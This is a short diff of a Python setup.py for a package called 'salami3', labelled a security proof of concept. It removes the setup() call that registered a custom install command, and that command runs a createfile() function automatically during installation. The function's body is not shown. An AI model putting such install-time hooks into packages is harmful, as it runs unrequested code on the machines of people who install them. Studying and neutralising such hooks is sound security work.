@@ -31,15 +31,4 @@ class PostInstallCommand(install):
          createfile()
          install.run(self)
 
-setup(name='salami3',
-      version='0.1.4',
-      description='Security project for PoC .',
-      author='zer0ul',
-      author_email='zer0ul@vulnium.com',
-      url='https://google.com',
-      packages=[],
-      cmdclass={
-         'install' :  PostInstallCommand,
-      },
-
-     )
+# setup(...) removed                                                                                                                                                                                                                                                                       
